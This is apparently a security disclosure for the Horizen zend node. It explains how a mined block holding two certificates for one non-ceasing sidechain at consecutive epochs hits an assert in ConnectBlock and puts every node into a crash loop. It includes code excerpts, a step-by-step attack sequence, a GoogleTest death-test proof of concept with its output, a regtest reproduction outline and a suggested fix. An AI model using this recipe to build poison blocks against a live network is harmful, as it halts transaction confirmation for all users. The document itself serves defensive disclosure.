# Missing per-block certificate-uniqueness check for non-ceasing sidechains lets any miner reach `assert(isBlockTopQualityCert)` in `ConnectBlock`, permanently halting the entire Horizen network (total network shutdown)

## Brief/Intro

For non-ceasing sidechains, `ConnectBlock` enforces with a bare C `assert()` that every certificate in a block is the block's top-quality certificate for its sidechain. The rule that actually guarantees this ("at most one certificate per non-ceasing sidechain per block") is enforced **only at mempool admission**, not in block validation. As a result, a single PoW block that contains two certificates for the same non-ceasing sidechain at consecutive epochs makes the first certificate non-top, tripping `assert(false)` and aborting the process of **every** validating full node that tries to connect the block. Because the block is written to disk before connection, nodes re-crash on restart — a persistent, network-wide chain halt that requires manual operator intervention to recover. The certificate proofs are never verified before the crash, so the attack needs **no sidechain proving key and no special privileges** — only the ability to mine one block.

## Vulnerability Details

### Background

A *non-ceasing* sidechain is one with `version == 2` and `withdrawalEpochLength == 0` (`src/sc/sidechain.h:220-228`, `isNonCeasingSidechain`). Non-ceasing sidechains have been active on Horizen **mainnet since block height 1,363,115** (`src/zen/forks/fork10_nonceasingsidechainfork.cpp`). Unlike the original ceasing sidechains, a non-ceasing sidechain can have certificates for several consecutive epochs, and the certificate-ordering rules were deliberately relaxed to allow this.

### The invariant the code assumes, and where it is (not) enforced

In `ConnectBlock`, every certificate is processed in block order, and for a non-ceasing sidechain the code asserts the certificate is the block-top-quality one:

```cpp
// src/main.cpp:3761-3764  (ConnectBlock, per-certificate loop)
bool isBlockTopQualityCert = highQualityCertData.count(cert.GetHash()) != 0;
if (sidechain.isNonCeasing())   // For non-ceasing SC cert should always be top quality
{
    assert(isBlockTopQualityCert);
}
```

The comment ("cert should always be top quality") shows the developers believe this is an invariant. It is not. `HighQualityCertData()` records only **one** certificate per sidechain — the last one in block order (highest epoch) — via reverse iteration and a `visitedScIds` set:

```cpp
// src/main.cpp:980-1009  (connect variant)
std::set<uint256> visitedScIds;
for (auto itCert = blockToConnect.vcert.rbegin(); itCert != blockToConnect.vcert.rend(); ++itCert) {
    if (visitedScIds.count(itCert->GetScId()) != 0)
        continue;                          // earlier-epoch cert for same scId is SKIPPED
    ...
    else
        res[itCert->GetHash()] = uint256();
    visitedScIds.insert(itCert->GetScId());
}
```

So if a block carries two certificates for the same non-ceasing sidechain at epochs `N` and `N+1`, only the `N+1` certificate is recorded as top-quality; the `N` certificate is absent from the map.

The only check that prevents two certificates for the same non-ceasing sidechain from coexisting is at **mempool admission**:

```cpp
// src/main.cpp:1322  (AcceptToMemoryPool — MEMPOOL ONLY)
if (sc.isNonCeasing() && pool.certificateExists(cert.GetScId()))
{
    state.Invalid(... CValidationState::Code::INVALID, "bad-sc-cert-conflict");
    return MempoolReturnValue::INVALID;
}
```

There is **no equivalent in block validation.** The certificate-ordering check that runs during `CheckBlock` was relaxed for non-ceasing sidechains to permit increasing epochs for the same sidechain:

```cpp
// src/main.cpp:1047-1079  CheckCertificatesOrdering — only rejects DECREASING epoch order
// (commit 423c5b474 changed the same-scId epoch comparison from `!=` to `>`)
if (bestCertData.first > cert.epochNumber)        // reject only if epoch goes backwards
    return state.DoS(100, ... "bad-cert-epoch-ordering-in-block");
```

A grep of the entire `src/` tree confirms `pool.certificateExists` (mempool) is the **sole** same-sidechain-per-block guard; nothing in `CheckBlock`, `ContextualCheckBlock`, or `CheckCertificatesOrdering` enforces uniqueness.

### Why the first certificate reaches the assert (and why no valid proof is needed)

`ConnectBlock` processes certificates in forward (block) order. For the block `vcert = [cert(epoch=N), cert(epoch=N+1)]`:

```cpp
// src/main.cpp  (ConnectBlock control flow, abbreviated)
3654  for (certIdx = 0; certIdx < block.vcert.size(); certIdx++) {   // forward order
3720      ret_code = view.IsCertApplicableToState(cert);            // STATE checks only — NO SNARK
3722      if (ret_code != OK) return state.DoS(100, ...);           // clean reject (NOT taken for cert-N)
3730      scVerifier.LoadDataForCertVerification(view, cert);       // only QUEUES the proof
3761      bool isBlockTopQualityCert = highQualityCertData.count(cert.GetHash()) != 0;
3764      if (sidechain.isNonCeasing()) assert(isBlockTopQualityCert);   // cert-N: assert(false) → abort()
3883  }
3967  scVerifier.BatchVerify();   // SNARK proofs ACTUALLY verified here — never reached
```

Two consequences:

1. **cert-N (certIdx 0) is processed first.** It references epoch `N = lastTopQualityCertReferencedEpoch + 1` (the next expected epoch), so it passes `IsCertApplicableToState`. Its `isBlockTopQualityCert` is `false` (it is not in `HighQualityCertData`), `isNonCeasing()` is `true`, so `assert(false)` fires and the node aborts. cert-N+1 (certIdx 1) is never processed.

2. **The crash precedes proof verification.** `LoadDataForCertVerification` (`src/sc/proofverifier.cpp:148`) only *queues* the proof; the cryptographic check `BatchVerify()` runs at `main.cpp:3969`, **after** the loop. The assert at 3764 aborts long before that. The real `IsCertApplicableToState` (`src/coins.cpp:1172`) checks only sidechain existence, custom-field config, a resolvable cumulative-tree root, certificate timing, quality, `BWT ≤ balance`, and the proof+vk **byte size** — never the SNARK itself. Therefore the attacker's certificates need only be **well-formed with dummy proofs of valid size**; every field is constructible from public on-chain data. **No sidechain proving key is required.**

`IsCertApplicableToState` is invoked in exactly two places — mempool (`main.cpp:1279`) and the ConnectBlock loop (`main.cpp:3720`) — so cert-N+1's epoch mismatch is never evaluated before ConnectBlock, and inside ConnectBlock the node has already crashed on cert-N.

Asserts are live in release builds: `configure.ac` defines no `-DNDEBUG` (standard Bitcoin/Zcash practice — `assert()` is used as a consensus guard). A symmetric reachable assert exists on the disconnect path (`src/main.cpp:2886`, `DisconnectBlock`).

### Attack sequence

1. The attacker creates (or reuses) a non-ceasing sidechain (`version=2`, `withdrawalEpochLength=0`). Sidechain creation is permissionless.
2. The attacker constructs two well-formed certificates for that sidechain at consecutive epochs `N` and `N+1`, each carrying a dummy proof of valid size. cert-N references the next expected epoch and a real cumulative-tree root from chain history.
3. The attacker mines one valid-PoW block with `vcert = [cert(epoch=N), cert(epoch=N+1)]`, bypassing the mempool uniqueness check.
4. The block passes `CheckBlock` and `ContextualCheckBlock` (PoW valid; `CheckCertificatesOrdering` permits increasing epochs; certificate proofs are not yet verified). It is accepted and written to disk by `AcceptBlock`.
5. `ActivateBestChain → ConnectBlock` processes cert-N first → `assert(false)` → **every node that connects this block aborts.**
6. On restart, nodes re-read the persisted block and re-attempt connection → re-crash. The network is halted until operators manually `invalidateblock`/reindex or deploy a patched binary.

## Impact Details

**In-scope impact:** *Network not being able to confirm new transactions (total network shutdown)* / unintended permanent chain halt of a live PoW Layer-1.

A single crafted block deterministically crashes the `zend` process of every validating full node on the network at consensus-validation time. Because the offending block is persisted before the crash, affected nodes enter a **crash loop** on restart (the classic "poison block"): each restart re-attempts to connect the same block and aborts again. Recovery is not automatic — every node operator must intervene out-of-band (mark the block invalid and reindex, or run a hotfixed binary). Until a coordinated response completes, the chain cannot advance: no new blocks are validated, no transactions or certificates confirm, exchanges/bridges/services depending on the chain stall.

**Quantified severity drivers:**
- **Blast radius:** 100% of validating full nodes (the assert is in the consensus path executed identically by every node).
- **Persistence:** indefinite until manual remediation (poison block survives restarts).
- **Privilege required:** none beyond mining a single block — **no admin role, no governance, no sidechain proving key, no valid SNARK proof.** Preconditions are self-satisfiable (the attacker can create the required non-ceasing sidechain).
- **Cost:** for any existing miner/pool, effectively the opportunity cost of one block; for an outsider, renting hashpower sufficient to find one block at network difficulty.
- **Funds:** no direct theft or inflation (value conservation holds on this path), but a total network halt of a live L1 is a maximal availability/integrity impact and typically classified **Critical** for blockchain/DLT programs.

The only factor distinguishing this from a fully unprivileged remote attack is the PoW requirement (the attacker must mine the poison block, since mempool admission would otherwise reject the second certificate). This narrows the actor set to "any miner," not the severity of the outcome.

## References

- Reachable assert (connect): `src/main.cpp:3761-3764` (`ConnectBlock`)
- Reachable assert (disconnect mirror): `src/main.cpp:2880-2888` (`DisconnectBlock`)
- One-cert-per-sidechain recorded: `src/main.cpp:980-1009` (`HighQualityCertData`)
- Relaxed ordering (root cause): `src/main.cpp:1047-1079` (`CheckCertificatesOrdering`), introduced by commit `423c5b474` "Relaxed checks on CheckCertificatesOrdering"
- Uniqueness enforced only in mempool: `src/main.cpp:1322` (`AcceptToMemoryPool`), commit `b22bc8335` "Never allow more than 1 cert in mempool for non-ceasing sc"
- State applicability (no SNARK): `src/coins.cpp:1172` (`IsCertApplicableToState`)
- Proof only queued before assert / verified after: `src/main.cpp:3730` (`LoadDataForCertVerification`) and `src/main.cpp:3969` (`BatchVerify`); `src/sc/proofverifier.cpp:148`
- Non-ceasing definition: `src/sc/sidechain.h:220-228` (`isNonCeasingSidechain`)
- Mainnet activation height 1,363,115: `src/zen/forks/fork10_nonceasingsidechainfork.cpp`
- Asserts live in release builds: `configure.ac` (no `-DNDEBUG`)

## Proof of Concept

### PoC 1 — Mechanical unit-level death test (gtest)

A GoogleTest death test in the project's existing sidechain block-connect suite drives `ConnectBlock` with a block carrying two certificates for one non-ceasing sidechain at consecutive epochs and asserts the process aborts at `assert(isBlockTopQualityCert)`.

File: `src/gtest/test_sidechain_blocks.cpp` — test `SidechainsConnectCertsBlockTestSuite.ConnectBlock_MultipleCerts_NonCeasing_SameScId_TriggersAssert`.

```cpp
TEST_F(SidechainsConnectCertsBlockTestSuite, ConnectBlock_MultipleCerts_NonCeasing_SameScId_TriggersAssert)
{
    mapCumtreeHeight.clear();

    // Non-ceasing sidechain initial state (version==2, withdrawalEpochLength==0).
    CSidechain initialScState;
    uint256 scId = uint256S("aaaa");
    initialScState.creationBlockHeight = 500;
    initialScState.fixedParams.withdrawalEpochLength = 0;   // non-ceasing marker
    initialScState.fixedParams.version = 2;                 // non-ceasing marker
    initialScState.lastTopQualityCertHash = uint256S("cccc");
    initialScState.lastTopQualityCertQuality = 0;
    initialScState.lastTopQualityCertReferencedEpoch = 1987;
    initialScState.lastTopQualityCertBwtAmount = 50;
    initialScState.balance = CAmount(100);
    initialScState.lastInclusionHeight = 0;
    initialScState.InitScFees();
    ASSERT_TRUE(initialScState.isNonCeasing());
    storeSidechain(scId, initialScState);

    int certEpochNumber = initialScState.lastTopQualityCertReferencedEpoch + 1; // 1988 == next expected
    int certBlockHeight = 600;

    uint256 inputCertEpochNHash  = txCreationUtils::CreateSpendableCoinAtHeight(*sidechainsView, certBlockHeight-COINBASE_MATURITY);
    uint256 inputCertEpochN1Hash = txCreationUtils::CreateSpendableCoinAtHeight(*sidechainsView, certBlockHeight-COINBASE_MATURITY-1);
    chainSettingUtils::ExtendChainActiveToHeight(certBlockHeight - 1);

    // FIRST cert in block order: epoch N (== lastTop+1). Becomes NON-top (HighQualityCertData keeps the LAST
    // cert per scId), yet is processed FIRST -> trips the assert.
    CMutableScCertificate certEpochN;
    certEpochN.vin.push_back(CTxIn(inputCertEpochNHash, 0, CScript(), 0));
    certEpochN.nVersion    = SC_CERT_VERSION;
    certEpochN.scProof     = CScProof{SAMPLE_CERT_DARLIN_PROOF};
    certEpochN.scId        = scId;
    certEpochN.epochNumber = certEpochNumber;        // 1988
    certEpochN.quality     = 1;
    certEpochN.endEpochCumScTxCommTreeRoot = chainActive.Tip()->pprev->scCumTreeHash;
    certEpochN.addBwt(CTxOut(CAmount(90), dummyScriptPubKey));

    // SECOND cert: epoch N+1 (== lastTop+2). Recorded as the (only) top-quality cert for scId.
    CMutableScCertificate certEpochN1;
    certEpochN1.vin.push_back(CTxIn(inputCertEpochN1Hash, 0, CScript(), 0));
    certEpochN1.nVersion    = SC_CERT_VERSION;
    certEpochN1.scProof     = CScProof{SAMPLE_CERT_DARLIN_PROOF};
    certEpochN1.scId        = scId;
    certEpochN1.epochNumber = certEpochNumber + 1;   // 1989
    certEpochN1.quality     = 1;
    certEpochN1.endEpochCumScTxCommTreeRoot = chainActive.Tip()->pprev->scCumTreeHash;
    certEpochN1.addBwt(CTxOut(CAmount(90), dummyScriptPubKey));

    CBlock certBlock;
    fillBlockHeader(certBlock, uint256S("aaa"));
    certBlock.vtx.push_back(createCoinbase(dummyCoinbaseScript, dummyFeeAmount, certBlockHeight));
    certBlock.vcert.push_back(certEpochN);    // epoch N first  -> becomes non-top -> hits assert
    certBlock.vcert.push_back(certEpochN1);   // epoch N+1 second -> recorded as the top-quality cert

    CBlockIndex* certBlockIndex = AddToBlockIndex(certBlock);
    certBlockIndex->nHeight = certBlockHeight;
    certBlockIndex->pprev = chainActive.Tip();
    certBlockIndex->pprev->phashBlock = &dummyHash;
    CreateCheckpointAfter(certBlockIndex);

    // The epoch-N cert is non-top for a non-ceasing SC -> assert(isBlockTopQualityCert) fires in ConnectBlock.
    ASSERT_DEATH({
        ConnectBlock(certBlock, dummyState, certBlockIndex, *sidechainsView, dummyChain,
                     flagBlockProcessingType::CHECK_ONLY, flagScRelatedChecks::OFF,
                     flagScProofVerification::ON, flagLevelDBIndexesWrite::OFF,
                     &dummyCertStatusUpdateInfo);
    }, "isBlockTopQualityCert");
}
```

Build and run:

```bash
# build the gtest binary (x86_64 deps + zend test harness)
./zcutil/build.sh --legacy-cpu -j$(nproc)
# run the death test (threadsafe style required: zend is multithreaded, so the
# default fork-based death test deadlocks on inherited mutexes)
src/zen-gtest --gtest_death_test_style=threadsafe \
   --gtest_filter='*ConnectBlock_MultipleCerts_NonCeasing_SameScId_TriggersAssert*'
```

**Executed result — PASS** (built and run against `zend` 6.0.0, x86_64):

```
[==========] Running 1 test from 1 test suite.
[ RUN      ] SidechainsConnectCertsBlockTestSuite.ConnectBlock_MultipleCerts_NonCeasing_SameScId_TriggersAssert
[       OK ] SidechainsConnectCertsBlockTestSuite.ConnectBlock_MultipleCerts_NonCeasing_SameScId_TriggersAssert (125 ms)
[  PASSED  ] 1 test.
```

The `ASSERT_DEATH(...)` passed, i.e. `ConnectBlock` aborted at `assert(isBlockTopQualityCert)` (`main.cpp:3764`) while processing the epoch-N certificate, matching the expected death regex `"isBlockTopQualityCert"`. The static control-flow — `assert` at `main.cpp:3764` preceding `BatchVerify` at `main.cpp:3969` — independently establishes that no valid proof is required to reach the crash. **[POC-PASS]**

### PoC 2 — End-to-end regtest reproduction (network-level)

Demonstrates the production-equivalent path (no test doubles), confirming a mined block halts a real node:

1. Start `zend -regtest` and mine past the non-ceasing fork activation (regtest height 480; `fork10_nonceasingsidechainfork.cpp`).
2. Create a non-ceasing sidechain (`sc_create` with `version=2`, `withdrawalEpochLength=0`); fund and let it reach a certifiable epoch.
3. Produce certificate for epoch `N` and certificate for epoch `N+1` for that sidechain.
4. Using `getblocktemplate`/a patched miner, assemble a single block whose `vcert` contains both certificates in increasing-epoch order (bypassing mempool, which would reject the second via `pool.certificateExists`), and submit it.
5. Observe: `zend` aborts on connection at `main.cpp:3764`; on restart it re-crashes attempting to reconnect the persisted block (poison-block crash loop).

(The existing functional test `qa/rpc-tests/sc_cert_nonceasing.py` provides the scaffolding — non-ceasing SC creation, multi-epoch certification, and block assembly — to script this end-to-end.)

### Suggested fix

Enforce "at most one certificate per non-ceasing sidechain per block" at **block validation** and reject gracefully instead of asserting:

- In `CheckCertificatesOrdering` (or `ContextualCheckBlock`), for each non-ceasing sidechain, reject any block containing more than one certificate for that sidechain: `state.DoS(100, ..., "bad-sc-cert-multiple-nonceasing")`.
- Replace the two reachable `assert(isBlockTopQualityCert)` consensus guards (`main.cpp:3764` and the disconnect mirror at `2886`) with a `state.DoS(100, ...)` rejection, so a malformed block can never abort the node process.
